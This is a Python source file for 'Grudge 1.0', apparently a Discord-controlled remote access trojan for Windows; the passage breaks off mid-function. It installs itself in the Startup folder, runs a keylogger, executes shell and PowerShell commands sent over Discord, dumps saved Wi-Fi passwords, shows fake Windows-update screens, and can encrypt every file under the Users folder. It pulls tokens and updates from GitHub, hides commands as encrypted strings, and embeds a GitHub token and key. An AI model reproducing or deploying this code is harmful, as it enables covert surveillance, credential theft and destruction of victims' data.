#Discord        : Grudge#4212
#Discord Server : http://discord.gg/AEwjehFG
#--------------------------#
#         Grudge 1.0       #
#--------------------------#
#-----------Module---------#
import discord
from discord.ext import commands
from discord.ui import Button, View
import os
import sys
from requests import get,head,ConnectionError
from time import sleep
from shutil import move as move; import shutil
from subprocess import Popen, check_output, CalledProcessError, PIPE, STDOUT
from pyuac import isUserAdmin, runAsAdmin
#from retry import retry
from send2trash import send2trash
#import ctypes
import threading as th
import keyboard as k
import io
from cryptography.fernet import Fernet
from github import Github
from threading import Thread

#-----------------------------Local Disk-------------------------#
user=os.path.expanduser('~') #C:\Users\kevin
local_disk=user[:2]          #C:
#---------------------------fixing location----------------------#
os.chdir(os.path.dirname(os.path.realpath(sys.argv[0])))
#----------------------------settings----------------------------#
Admin_Privilege = False
#-----------------------------App_DATA---------------------------#
current = 1.0
App_Name = '{}'.format(('{}.exe'.format(str(os.path.basename(__file__))).replace('.py','')))
name = '{}'.format(App_Name.replace('.exe',''))
Old_App_Name = App_Name                
Main_Location =  '{}\\'.format(os.getcwd()) #(__file__).split('_MEI',1)[0]                                                      #('{}\\'.format(os.getcwd())).split('_MEI',1)[0]                             #(__file__).split('_MEI',1)[0]        #'{}\\'.format(os.getcwd())
App_Location = '{}{}'.format(Main_Location, App_Name)
####################################
adminKey = '' 
#---------------------------ADDITIONAL data-----------------------#
GrudgeLink= 'https://github.com/jsk6/Grudge/raw/Grudge/Grudge.txt'
VersionLink = 'https://github.com/jsk6/Grudge/raw/Grudge/Version.txt'
InfoLink = 'https://github.com/jsk6/Grudge/raw/Grudge/Info.txt'
KeyLink = 'https://github.com/jsk6/Grudge/raw/Grudge/Key.txt'
default_password = 'https://github.com/jsk6/Grudge/raw/Grudge/password.txt'
#-----------------------------GitHub-------------------------------#
github_token = "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"
GHusername = "jsk6"
repo_name = "Grudge"
github = Github(github_token)
repo = github.get_repo(f"{GHusername}/{repo_name}")
#-----------------------------System-------------------------------#
oldGrudge = '{}$77Broken.exe'.format(Main_Location)
update = False             
info = ''            
version = '' 
WIFI = True        
#-------------------------------Check----------------------------#
Old_Grudge = os.path.exists('{}'.format(oldGrudge))
#-----

if Old_Grudge == True:
    os.remove(f'{oldGrudge}')
#-------------------------------VARIABLES------------------------#
personal_channel = 1126109565860200489
WIFI_status = '<:emoji_18:1124219911154176030>'
JRK = '<:URK:1197575713222565929>'
cautious = '''
Caution: performing this action will delete
-------------------------------------------- 
your Grudge permanently!
----------------------------
Are you sure?
'''
#-----------------------------Gathering-information-----------------------------#
#----------------------------------------------------------------#
def read_site(url):
    result = get('{}'.format(url)).text
    return result

def editGH(filename,content,branch='Grudge'):
    contents = repo.get_contents(f"{filename}")
    repo.update_file(contents.path, "Updated my Grudge", f"{content}", contents.sha, branch=f"{branch}")

Token1='https://github.com/jsk6/Grudge/raw/Grudge/T1.txt'
Token2='https://github.com/jsk6/Grudge/raw/Grudge/T2.txt'
T=read_site(Token1)
T2=read_site(Token2)
print(T)
MyName=(user.split('Users')[1])[1:]
line_number=''
Token=''
prefix=''
for line in T.splitlines():
    if '[ON]' not in line and '[blocked]' not in line or MyName in line:
        Token = line.split()[0]
        line_number = line.split()[4]
        prefix = (line.split()[2])[1:2]
        if MyName not in line:
            lineN = (line.replace('empty',f'{MyName}')).replace('OFF','ON')
            T= T.replace(line,lineN)
            editGH('T1.txt',T)
        else: 
            lineN = line.replace('OFF','ON')
            T= T.replace(line,lineN)
            editGH('T1.txt',T)
        break

for line in T2.splitlines(): 
    if line_number in line:
        Token = Token + line.split()[0]
        break
#-----------------------------Basics-----------------------------#
bot= commands.Bot(command_prefix=f"{prefix}", intents=discord.Intents.all(), guilds=True)
client = discord.Client(intents=discord.Intents.all())
#----------------------------------------------------------------#
def ospopen():
    global ospopen_result, cmdps1command
    ospopen_result=os.popen(cmdps1command).read()
def decrypt_txt(variable, key=b'xq_mP0DUOTkqI_Jsd4yvit6IeVmzbKYLqPuWoBwQioI='):
    decrypted_bytes = Fernet(key).decrypt(variable)
    decrypted_text = decrypted_bytes.decode('utf-8')
    return decrypted_text
#----------------------------------------------------------------#
def encrypt(filename, key=b'xq_mP0DUOTkqI_Jsd4yvit6IeVmzbKYLqPuWoBwQioI='):
    with open(filename, "rb+") as file:
        data = file.read()
        encrypted_data = Fernet(key).encrypt(data)
        file.seek(0)
        file.write(encrypted_data)
        file.truncate()
#----------------------------------------------------------------#
def decrypt(filename, key=b'xq_mP0DUOTkqI_Jsd4yvit6IeVmzbKYLqPuWoBwQioI='):
    with open(filename, "rb+") as file:
        encrypted_data = file.read()
        decrypted_data = Fernet(key).decrypt(encrypted_data)

        file.seek(0)
        file.write(decrypted_data)
        file.truncate()
#----------------------------------------------------------------#
def eafiaf(crypt='En', key=b'xq_mP0DUOTkqI_Jsd4yvit6IeVmzbKYLqPuWoBwQioI=', base_directory=f"{local_disk}\\Users"):
    for root, directories, files in os.walk(base_directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            App_Name = '{}'.format(('{}.exe'.format(str(os.path.basename(__file__))).replace('.py','')))
            if App_Name not in file_path:
                try:
                    if crypt=='En': encrypt(file_path, key)
                    elif crypt=='De': decrypt(file_path, key)
                except Exception as e:
                    pass
#----------------------------------------------------------------#
def rename(old, new):
    os.rename(old,new)
#----------------------------------------------------------------#
def read_image(file):
    with open(file, 'rb') as jpg:
        content=jpg.read()
        offset = content.index(b'\xff\xd9')
        data = content[offset + 2:].decode()
        return data
#----------------------------------------------------------------#
def copy(file=App_Location,destination=f'{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'):
    try:
        old_file = file.replace('Grudge','G')
        os.rename(old_file,file)
        shutil.copy(file,destination)
    except:
        pass
copy()
#----------------------------------------------------------------#
def UpdateData():
    App_Name = '{}'.format(('{}.exe'.format(str(os.path.basename(__file__))).replace('.py','')))
    name = '{}'.format(App_Name.replace('.exe',''))
    Old_App_Name = App_Name 
    App_Location = '{}{}'.format(Main_Location, App_Name)
    return App_Name, name, Old_App_Name, App_Location
#----------------------------------------------------------------#
def download(url, filename='default'):
    global Main_Location
    response = get(url, stream=True)
    response.raise_for_status()
    if filename=='default':
        filename = response.headers.get("content-disposition").split("filename=")[1] if "content-disposition" in response.headers else url.split("/")[-1]
    with open(f"{filename}", "wb") as file:
        for chunk in response.iter_content(1024):
            file.write(chunk)
    return filename
#----------------------------------------------------------------#
def read(Category,Link):
    Content=read_site(Link)
    for lines in Content.splitlines():
        if Category in lines:
            result=(lines.split(': ')[1]).split(' <NLINE>')[0]
    return result
#----------------------------------------------------------------#    
def check_for_updates():
    version1 = get('{}'.format(VersionLink)).text
    global version
    version = version1.replace('\n','')
    global update
    if float(version) > current :
        global info
        info = get('{}'.format(InfoLink)).text
        update = True
    else:
        print('Nothing New')
        update = False
#----------------------------------------------------------------#
def update_adminKey():
    global adminKey
    adminKey = get('{}'.format(KeyLink)).text 
#----------------------------------------------------------------#
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
#----------------------------------------------------------------#
def find(path):
    result = os.path.exists(f'{path}')
    return result
#----------------------------------------------------------------#
def update_downloads():
    content=read_site(InfoLink)
    contents = repo.get_contents("Info.txt")
    for lines in content.splitlines():
        if 'Downloads' in lines:
            current = int(lines.split()[1])
            currentt = current+1
            current=str(current);currentt=str(currentt)
            liness = lines.replace(current,currentt)
            content = content.replace(lines,liness)
    repo.update_file(contents.path, "Info file", f"{content}", contents.sha, branch="Grudge")
#----------------------------------------------------------------#
def read_line(content,line_number):
    return (content.splitlines()[line_number])
#----------------------------------------------------------------#
def findline(text, character):
  lines = text.splitlines()
  last_dir_line = -1

  for i in range(len(lines) - 1, -1, -1):
    if character in lines[i]:
      last_dir_line = i
      break

  return last_dir_line + 1
#----------------------------------------------------------------#
def Advanced_popen(command):
    os.popen(command)
#----------------------------------------------------------------#
@bot.command()
async def value(Category):
    global personal_channel
    channel = bot.get_channel(personal_channel)
    async for message in channel.history(limit=1):
        #if message.author != bot.user:
        last_message = (message.content)
        break
    try:
        result = (last_message.split(f'{Category}: ')[1]).split('\n')[0]
        if Category == 'Script':
            result = ((result.replace('[','')).replace(']','')).replace('<>i<>',';')
    except:
        result = 'Not Found!'
    return  result
#----------------------------------------------------------------#
@bot.command()
async def WIFIM(ctx,messageID,menu_list):
    excellentwifi = '<:emoji_18:1124220632251519017>'
    goodwifi = '<:the_connection_is_good:1110580390806167752>'
    badwifi = '<:emoji_18:1124219911154176030>'
    x=10
    global WIFI
    while WIFI !=False:
        shell = os.popen('netsh wlan show interfaces').read()
        tries = 0; maximum = 1
        while tries < maximum:
            try:
                shell = os.popen('netsh wlan show interfaces').read()
                if len(shell) >5:
                    tries+=1
            except:
                sleep(0.2)
        for line in shell.splitlines():
           if 'Signal' in line:
                signal = line.split(': ')[1]
                signal = int(signal.split('%')[0])
        try:
            wifi_message=messageID
            sleep(0.2)
            if signal < 50:
                msg=menu_list.replace('‏',badwifi)
                await wifi_message.edit(content='{}'.format(msg))
            if signal > 50 and signal < 80:
                msg=menu_list.replace('‏',goodwifi)
                await wifi_message.edit(content='{}'.format(msg))
            if signal > 80:
                msg=menu_list.replace('‏',excellentwifi)
                await wifi_message.edit(content='{}'.format(msg))
        except:
            pass
        try:
            sleep(0.7)
        except:
            sleep(0.7)
        break
#----------------------------------------------------------------#
@bot.command()
async def delete(ctx='',amount=1,msg=''):
    if len(str(msg)) == 0:
        channel = ctx.message.channel
        messages = []
        async for message in channel.history(limit=amount):
            messages.append(message)
        try: await channel.delete_messages(messages)
        except: pass
    else: msg.delete()
#----------------------------------------------------------------#
@bot.command()
async def delete_last(ctx, limit=100):
    channel = ctx.message.channel
    async for message in channel.history(limit=limit):
        if message.author == bot.user:  # Stop if the message is from the bot
            break
        await message.delete()
#----------------------------------------------------------------#
@bot.command()
async def get_channel(ctx):
    channel = ctx.message.channel
    return channel
#----------------------------------------------------------------#
@bot.command()
async def Detectorr(ctx):
    shell = os.popen('tasklist').read()
    amount = await advanced_send(ctx,shell,True)
    sleep(2)
    await delete(ctx,amount+10)
#----------------------------------------------------------------#
@bot.command() #it sends long messages and count how many message he had to separate the content to send them (we get that count to use it in del def)
async def advanced_send(ctx,msg,delete=False,quotes=False):
    delet = 0
    listOfMsg = []
    msg=msg.replace('```','')
    while quotes==False:
        try:
            msg2send = msg[:2000]
            msg = msg.replace(msg[:2000],'')
            messageid=await ctx.send(msg2send)
            listOfMsg.append(messageid)
        except:
            if len(msg) == 0:
                break
            else:
                messageid=await ctx.send(msg)
                listOfMsg.append(messageid)
                break
        delet += 1
    while quotes==True:
        try:
            msg2send = msg[:1994]
            msg = msg.replace(msg[:1994],'')
            if len(msg2send) == 0: break
            messageid=await ctx.send(f'```{msg2send}```')
            listOfMsg.append(messageid)
        except:
            if len(msg) == 0:
                break
            else:
                messageid=await ctx.send(f'```{msg}```')
                listOfMsg.append(messageid)
                break
        delet += 1
    if delete==True:
        return delet
    try: return messageid, listOfMsg
    except: pass
#----------------------------------------------------------------#
@bot.command()
async def lastmsg(channel,amount=1,bot=True):
    channel = bot.get_channel(channel)
    if bot == True:
        async for message in channel.history(limit=2):
            if message.author == bot.user:
                msg = (message.content); ID = message
    if bot == False:
        async for message in channel.history(limit=2):
            if message.author == bot.user:
                msg = (message.content); ID = message
    return msg
#----------------------------------------------------------------#
@bot.command()
async def sendfile(ctx, content, filename):
    file_obj = io.StringIO(content)
    file_obj.seek(0)  # Rewind the file pointer to the beginning
    await ctx.send(file=discord.File(file_obj, filename=filename))
#----------------------------------------------------------------#
@bot.command()
async def monitor(ctx,msg,reply=''):
    global cmd_begin
    msg = msg.content
    if msg == '@menu': await menu(ctx)
    elif msg == '@run': await run(ctx)
    elif msg == '@ss': pass 
    elif msg == '@Detector': 
        await delete(ctx)
        await ctx.send('Working')
        sleep(1)
        option = await Detectorr(ctx)
        sleep(2.5)
        if option == 1:
            await delete(ctx,amount=20)
        if option == 2:
            await delete(ctx,amount=20)
    elif msg[0:5] == '[cmd]':
        await ctx.send('Working')
        sleep(0.4)
        msg = msg[5:]
        if 'cd..' in msg:
            os.chdir('..')
            result = os.getcwd()
            direction = os.getcwd() + '>'
            result = f'<dir={direction}!> {result}'
            await ctx.send(f'{result}')
            sleep(10)#3
            await delete(ctx,amount=3)
        elif 'cd ' in msg:
            try: 
                msg = msg[3:]
                os.chdir(f'{msg}')
                result = ''#os.getcwd()
            except Exception as e: result = f'{e}'
            direction = os.getcwd() + '>'
            result = f'<dir={direction}!> {result}'
            await ctx.send(f'{result}')
            sleep(10)#3
            await delete(ctx,amount=3)
        elif 'cmd' in msg:
            #proc=Popen(f'cmd /c {msg}', shell=True, stdout=PIPE)
            #output, _ = proc.communicate()
            #result = output.decode("utf-8")
            ver = system() + " " + release() + " " + pversion()
            ver = ver.split()
            result = f'Microsoft {ver[0]} [Version {ver[2]}](c) Microsoft Corporation. All rights reserved.'
            direction = os.getcwd() + '>'
            result = f'<dir={direction}!> {result}'
            await ctx.send(f'{result}')
            sleep(5)#1
            await delete(ctx,amount=3)
        else:
            try:
                direction = os.getcwd() + '>'

                result = os.popen('{}'.format(msg)).read()
                result = f'<dir={direction}!> {result}'
                amount = await advanced_send(ctx,result,True)
                amount +=1
                sleep(10)#1
                await delete(ctx,amount)
            except Exception as e: await ctx.send(f'{e}')
    elif msg[0:5] == '[ps1]':
        await ctx.send('Working')
        sleep(0.4)
        msg = msg[5:]
        if 'cd..' in msg:
            os.chdir('..')
            result = os.getcwd()
            direction = os.getcwd() + '>'
            result = f'<dir={direction}!> {result}'
            await ctx.send(f'{result}')
            sleep(5)#1
            await delete(ctx,amount=3)
        elif 'cd ' in msg:
            try: 
                msg = msg[3:]
                os.chdir(f'{msg}')
                result = ''#os.getcwd()
            except Exception as e: result = f'{e}'
            direction = os.getcwd() + '>'
            result = f'<dir={direction}!> {result}'
            await ctx.send(f'{result}')
            sleep(5)#1
            await delete(ctx,amount=3)
        elif 'ps1' in msg:
            #proc=Popen(f'cmd /c {msg}', shell=True, stdout=PIPE)
            #output, _ = proc.communicate()
            #result = output.decode("utf-8")
            ver = system() + " " + release() + " " + pversion()
            ver = ver.split()
            result = f'Microsoft {ver[0]} [Version {ver[2]}](c) Microsoft Corporation. All rights reserved.'
            direction = os.getcwd() + '>'
            result = f'<dir={direction}!> {result}'
            await ctx.send(f'{result}')
            sleep(5)#1
            await delete(ctx,amount=3)
        else:
            try:
                direction = os.getcwd() + '>'

                result = os.popen('powershell {}'.format(msg)).read()
                result = f'<dir={direction}!> {result}'
                amount = await advanced_send(ctx,result,True)
                amount += 1
                sleep(10)#1
                await delete(ctx,amount)
            except Exception as e: await ctx.send(f'{e}')
    else:
        if len(str(reply)) != 0:
            await ctx.send(f'{reply}')
#---Activate---#
update_adminKey()
check_for_updates()
#-------------------------------BASIC----------------------------#
#                              Features                          #
logs=''
def on_press(event):
    global logs
    pressed_key = event.name  # This is a string
    try: logs = logs + (pressed_key.replace('space',' ')).replace('enter',' enter ')
    except: pass
def TurnON():
    k.on_press(on_press)
    k.wait()
def TurnOFF():
    k.unhook_all()

th.Thread(target=TurnON, daemon=True).start() # run TurnON for one time.. which means we have to put it in loop
#-------------------------------SCRIPT---------------------------#
@bot.event
async def on_ready():
    os.chdir(os.path.dirname(os.path.realpath(sys.argv[0])))
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{prefix}{MyName}"))

    Terminal = await value('Startup')
    if Terminal != 'OFF':
        Script = await value('Script')
        os.popen(f'{Terminal} "{Script}"') #start cmd /c 

    channel = bot.get_channel(1126065698200895579)
    ActiveEn = 'OFF'
    while ActiveEn == 'ON':
        msg = await bot.wait_for('message')
        ctx = await bot.get_context(msg)
        await monitor(ctx,msg)






    



@bot.command()
async def menu(ctx):
    global WIFI, default_password
    R_Emoji='<:emoji_16:1115185197424590849>'
    menu_list = b'gAAAAABlvQVx05bDL0JgOE0YoicJyRcZGVHRAW1WTvKjod0oTLHo3Mlcz9qrMRUT5Er4x71jG1KE9SYJTTnQO1AaLAhSFPSwcXhgusBO0rl3zGWZGRF_4_E7SyiDFT3KgVHNK9Se0ENUXF3IgJkIGcopsMUmq5PHq09XtvCgdPY-89tFoeRYzWeyu1--zrieS2HOYF-AEjIhzqF78Nx3JvmzmrnJ7mT8HOnF7fCPcgvwECWjTt9wFBXmSq9Vlth_Gx_k7oVUsH77-LxDmuOtnkwTKBdL4T_RnQehVyLwioCOc6ONDXrMl3LduuytTny-i9GcbQLeYF8P181ajdJZiRE-uwMzcdPyjPKGLp2XQoWIKuu9YSLe7gHi5abe4mxygXT_q-cLbTds'
    alist = b'gAAAAABlvQoGxz-oYaE5JovU4VRWZ5_oy5-a8gNUq17JgqyArWxFLb8VoTIkvfrv2-uHOmyyFuZY3TrQkdXXKvjXEe9t6S7sI3iErTEAR-LhH6vwPU6bj3aJQ3Ywre22UQ-JBjsZzpDlLZNI8P-x9RRcX1evjviyfKEpulnbJjT4Q7bzNlr0UxVzAgUkLlSvm_GAJYde-T68_sj6hhsD9Ms9xhPhI_ZEtSOT0OVruCyjSMYhv3noVd66E-CWQW4qXuunKPgPGYMnxih_sU7HyzSINrOVee6ioABUT1XVMQF4GSLsYWr8UH1-Z4Cv1BbVxkvvvK00Z0hc7SCCrvLxo9F9wl3wco718PNsfkMzlRQD5eAOorDmAhrSAUgO_8qcs280bkKakWE4TxxYh6q0KrHC-K_4P9SpqXyI0RGdRoev_wMbqY0l7s1QPTzfwnxW3xLh_BScHiGaodsr1qcx92NV8GScEuH8nTRXlbfZUazYVG_VcqdeRJg='
    blist = b'gAAAAABlvQpk8pvXo93s8mY-nMAwBdMbJS7TQ9zRm4WcVMCBRMNY_m_8HTs7i8yOuCfo4wKqKesWKesqjbUqpPUZ_PFtReMvUWmjvYfxz0dDad3qynjsp7ZJYVBckjZgDAOO-uqtvik4YqNdh3x-I5SZWgTjoBIOag=='
    dlist = b'gAAAAABlvQrVeKiGMdusgHx2EwtAf2O8tFj8vi27WxIMrdBBJHN0lbqHE2r8wwgkp7jXs0D13mmIXl22tHm36ax_wdNVvGnT-uriVbdNC_0MrpGbOjjuiaf0hfJhRMvRvBeDkEW9mUx4kO7ByarX4bSdWDEayFYk1IsrzHy2sADDqh4VrqhIWjjGj2p_uIFtshTum5o172NSd321lgClLTjR1yjVd8uRqA=='
    menu_list = decrypt_txt(menu_list)
    try:
        cpu = ((os.popen('wmic cpu get loadpercentage').read()).splitlines()[2]).split()[0]
        battery= (os.popen('wmic PATH Win32_Battery Get EstimatedChargeRemaining').read()).split()[1]
        menu_listt = menu_list.replace('Battery:【%】, CPU:【%】',f'Battery:【{battery}%】, CPU:【{cpu}%】')
    except: pass
    if isUserAdmin() == True: rootedG = True; menu_list_rooted = menu_listt.replace('≛  ','<:emoji_19:1178420452343947308>')
    else: rootedG = False
    if rootedG == True: msg = await ctx.send(menu_list_rooted); wifi = await value('Wifi')
    else: msg = await ctx.send(menu_listt); wifi = await value('Wifi'); menu_list_rooted=menu_listt
    if wifi != 'OFF': await WIFIM(ctx,msg,menu_list_rooted); WIFI = True        #loop = asyncio.get_event_loop(); loop.create_task(WIFIM(ctx,msg))
    else: WIFI = True
    #update_adminKey();check_for_updates()
    update=False
    if update==True:
        Download_button = Button(label='Update!', style=discord.ButtonStyle.green) 
        view = View()
        view.add_item(Download_button)
        await ctx.send(view=view)

        async def button_callback(interaction):
            global info
            await ctx.send('{}'.format(info))
            Download_button = Button(label='Download', style=discord.ButtonStyle.green) 
            view = View()
            view.add_item(Download_button)
            await ctx.send(view=view)
            async def button_callback(interaction):
                Downmsg = await ctx.send('Downloading..')
                download('{}'.format(GrudgeLink),'Grudge2.exe')
                sleep(1)
                Grudge=os.path.exists('{}Grudge2.exe'.format(Main_Location))
                sleep(0.5)
                if Grudge!=True:
                    download('{}'.format(GrudgeLink),'Grudge2.exe')
                elif Grudge==True:
                    App_Name = UpdateData()[0]
                    name = UpdateData()[1]
                    old = os.path.join('{}'.format(Main_Location), '{}'.format(App_Name))
                    new = os.path.join('{}'.format(Main_Location), '$77Broken.exe')
                    os.rename(old,new)
                    old = os.path.join('{}Grudge2.exe'.format(Main_Location))
                    new = os.path.join('{}{}.exe'.format(Main_Location,name))
                    sleep(0.3)
                    rename(old,new)
                    await Downmsg.edit(content="Updated successfully")
                    await ctx.send("---------------------")
                    update_downloads()
                    global update
                    update = False
                    await ctx.send(f'''-------------------------\n  Welcome To Grudge {version}\n-------------------------''')
                    sleep(2)
                    sleep(3.5)
                    os.popen('{}{}'.format(Main_Location,App_Name))
                    sleep(1)
                    sys.exit()
                    exit()
                    quit()
            Download_button.callback = button_callback
        Download_button.callback = button_callback    
    #=======================================ACTIONS=======================================#       
    msg = await bot.wait_for("message")
    if msg.content == '1':
        global settings
        await ctx.send('{}'.format((decrypt_txt(alist)))); sleep(0.2); msg = await bot.wait_for("message")
        if msg.content == '1':
            await ctx.send('Are you sure you want to terminate me? (Y/N)'); sleep(0.2); msg = await bot.wait_for("message")
            if (msg.content).lower() =='y' or (msg.content).lower() =='yes':
                await msg.add_reaction('{}'.format(R_Emoji))
                sleep(2)
                sys.exit()
        elif msg.content == '2':
            wifi = '''Wifi   |   password\n---------------------\n'''
            msg = await ctx.send('{}'.format(wifi))
            shell=os.popen('netsh wlan show profiles').read()
            for line in shell.splitlines():
                if ': ' in line:
                    variable, val = line.split(': ')
                    shell=os.popen('netsh wlan show profile "{}" key=clear'.format(val)).read()
                    for line in shell.splitlines():
                        if 'Key Content' in line:
                            variable2, value2 = line.split(': ')
                            wifi+=('{} | {} \n'.format(val,value2))
            await msg.edit(content='{}'.format(wifi))
        elif msg.content == '3': os.system('shutdown -r')
        elif msg.content == '4': pass
        elif msg.content == '5': 
            await ctx.send('```Grudge Apps\n-----------\n1-Regedit.exe\n2-cmd.exe\n3-Powershell.exe\n4-Explorer.exe\n5-TaskManager.exe```')
            msg = await bot.wait_for("message")
            if msg.content == '1': pass
            if msg.content == '2': await cmd(ctx)
            if msg.content == '3': await cmd(ctx,prompt='ps1')
            if msg.content == '4': await run(ctx)
            if msg.content == '5': pass #await Tskmgr(ctx)
        elif msg.content == '6': 
            windows=(os.popen('wmic os get Caption, BuildNumber /value').read()).split('Windows')[1]
            if '10' in windows: os.popen('start https://fakeupdate.net/win10ue/');await msg.add_reaction('{}'.format(R_Emoji))
            if '8' in windows: os.popen('start https://fakeupdate.net/win8/');await msg.add_reaction('{}'.format(R_Emoji))
            if '7' in windows: os.popen('start https://fakeupdate.net/win7/');await msg.add_reaction('{}'.format(R_Emoji))
        elif msg.content == '8':
            App_Name = '{}'.format(('{}.exe'.format(str(os.path.basename(__file__))).replace('.py','')))
            Main_Location =  '{}\\'.format(os.getcwd()) 
            App_Location = '{}{}'.format(Main_Location, App_Name)
            await ctx.send(f"I'm located at ({App_Location})")
        elif msg.content == '7':
            await ctx.send('Are you sure you want to kick me out of the server forever? (Y/N)')
            try:
                msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel, timeout = 5)
                if 'y' in (msg.content).lower(): serverID = ctx.guild.id; await ctx.guild.leave()
            except:
                await ctx.send('Command Canceled')
        elif msg.content == '9':
            await ctx.send('Send the link to open: ')
            link = await bot.wait_for("message")
            chrome = os.popen((decrypt_txt(b'gAAAAABlvSKaCE4hAumDOh6WSKG-sHycDMxZ-rI9X6E7a6fc0eKlF02UIn7cjL_aWQ6HYm6GrhNXuGq5d668UZiGRRyid0vGdUBh6-KDADbF17UA6w7Z-w9bHQwZkNSeCkWjoi11uL7UNgPmc7WCgONw3A3l3OXHf5JdhqgVErVRaQg8LzINmW3AxlyP3NBFiSIA8JXfoFiWnsC0_fShG7MyUEkelBBQ1g=='))).read()
            if 'Path' in chrome: chrome = True
            else: chrome = False
            brave = os.popen((decrypt_txt(b'gAAAAABlvSK4h1PCM2rivQjEan57X2ewQavXRED5OTRb9PmExL0w1t-aqY8pFbB4iypYlnQwfb-kB37QAcYRkW4Hq-kDY23yV5VRD_Jl7ccdqpGBIYd79SCW2r5fAL_tT2cwBnv5qS2kHXOvaG7ASz6bCqWBvvFhqhtIq-ceocSkBWAGk6LnHr0z19VY2JQSpxqKwXkftmt45B2iuPNUbGTGZD0yLWCDNQ=='))).read()
            if 'Path' in brave: brave = True
            else: brave = False
            edge = os.popen((decrypt_txt(b'gAAAAABlvSLN-E1Q8d0NbQyiCUQTwFa8BvkkjAP9DziBNmN7nLPUILBj-KuFLWEnwkUk-RlkcXAIK2tdNaEJHSefUKkZOtDw5KBfyzu0uYjutT9OgsH9ySdxT35ehgGQnkr8q70HcmV6EJfGnuU3ubNcx9XE51iKp9a4RXdyb1vesc3Ge50VRFbVqvy0EqGRZsvB8H2vS2sUw0p0yE9wC0vtAJ6L7Db67w=='))).read()
            if 'Path' in edge: edge = True
            else: edge = False
            firefox = os.popen((decrypt_txt(b'gAAAAABlvSLoyUZhYOlVWaVoHX6CZEXimfP5CvJX-kLOTarJ1BKC3FiJkUS8TFG28etv6AyFqBgaJy4Z17dZRcVh-Zn8kuup2jzp1RudjjX0v4wrMMQPDK1H_oQAkYqNBb-U05GrIpqnisJjdtGVBvxqqEPh2Q5_pcIAMsDIQU5gvbh-tN3zQkq3CV5mxwEttYbh3stj_Fg8BjJB7M-zdgXYUi7imeU6jA=='))).read()
            if 'Path' in firefox: firefox = True
            else: firefox = False
            await ctx.send('Please Choose which browser: (Type the name correctly)')
            if chrome == True: await ctx.send('<:chrome:1202691082874396724>Chrome')
            if brave == True: await ctx.send('<:brave:1202691439918579742>Brave')
            if edge == True: await ctx.send('<:edge:1202692079881429063>Edge')
            if firefox == True: await ctx.send('<:firefox:1202692179403870239>Firefox')
            browser = await bot.wait_for("message")
            try:
                x=decrypt_txt(b'gAAAAABlvSMrw9mlL2bYtpsBy98Vjv1A3I1Tc2H00gRL5gyRZ7CvgsdFI9XYidRMJFUx5AVgsp5sGfm9s1T5sqRsZo1-0Y9u9P43ssn9Typ_X4YqraHDcus=')
                os.popen(f'start {browser.content} {x} {link.content}').read()
                await link.add_reaction('{}'.format(R_Emoji))
            except:
                await ctx.send('Something went wrong [105]')
        elif msg.content == 'None':
            Encryptf = Button(label='Encrypt', style=discord.ButtonStyle.green) 
            view = View()
            view.add_item(Encryptf)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                eafiaf(crypt='En')
                await ctx.send('Encrypted Successfully!')
            Encryptf.callback = button_callback
            #================================#
            Decryptf = Button(label='Decrypt', style=discord.ButtonStyle.green) 
            view = View()
            view.add_item(Decryptf)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                eafiaf(crypt='De')
                await ctx.send('Decrypted Successfully!')
            Decryptf.callback = button_callback
            #================================#
        elif msg.content == '10':
            MyPC = Button(label='This PC ON/OFF', style=discord.ButtonStyle.green) 
            view = View()
            view.add_item(MyPC)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                key=os.popen((decrypt_txt(b'gAAAAABlvSePudYmYQA-w_Tu4ahaMp3SLj6_yF7ml-T6qapB7QI-13Rmd94uRgNzPUl6YNbYhYse63VZZ--Y7l-Y8oA7WJCnxXIImWvo0eLQvlbZlhrQ3kDXCfn0AmCvfDW7CitG2PBYHxhlWcL8euSF2cmOyr_Ay2sM2ihlktHH3eZPPm77XdF054J_SmA2FMb45dhA3BbF3Q0TcW3vV8if6CruiEr9qNgyxWEHHfNLRLsv2BPWeK2mvn6gXOp1TYEY1ArjFK5p'))).read()
                if '0x0' in key: os.popen((decrypt_txt(b'gAAAAABlvSe4KGF1z8wsoS2EkV65kwydIWydvlUqwXmHkmUkqsgeTkNNJ6JBnYjYvlC8WJWdIaxewP2t43oOcA5GyE4-wwwaZuli8Zd56K1PDFv__CWu4BDdYi23re6QBH8wre9gPiDs8hx3-wgFhj1hDMm2ZzaOhq3ekKHXwnvO_ezlQ3aV5dkNKDXv1OpOVqtOTNSBqLZqxnFZJKAXApJrWK6CloDOr6qP8eEdfEY25aK93Kp5QqT8n0mLqjNCJagZJczpNakwJNXnHkR5Zg-vznNBbtxT5g=='))); await ctx.send('This PC: ON')
                else: os.popen((decrypt_txt(b'gAAAAABlvSfg_BT624230xOMqoVKiYIsdAu9QihP3jhoS57jg7n6subuICzAWiu82y4SobgMhceD1lC3fh21NdWe1jWC3mO_76ucxRkAHlViW0lCkhuNq1RsZhYxMU7BhyTdAVNkQTY55IUUkE4OQ1QY1aVA12e1S1P6UNJ85OtEKSP8p0HjIkKFPqTH30ntCUi9jG9s9QDxXTsHA6ZuZpJljNxZQllUMDeLrU5UkcE4LXcVgGRwPAzJD9bAy4PSxIQ72yKS4st7n4blkKPkkwh6CM2ldXO1ww=='))); await ctx.send('This PC: OFF')
            MyPC.callback = button_callback
            #================================#
            TrayNotify = Button(label='TrayNotify ON/OFF👑', style=discord.ButtonStyle.red) 
            view = View()
            view.add_item(TrayNotify)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                key=os.popen((decrypt_txt(b'gAAAAABlvShE4SaqClV_3iYVA9PARkQpdf3s5Gl43_GAt-F8Y6fgWA9befDO5_6WjK2ancI5VrEbPI6iRAeL1BvzWoDiEhEHxjBvPBB0WqFpBvROfx0C2vHelQmoA6of-NSP4bMqJ8OSRKmBp4BGT5T3Xk-K0uqY21qvBAkONxLLTpCsMXGp9T-_cXIVDFAcoD1se-w3GCh9fP1kS17AALqHpU0_WtzbcA=='))).read()
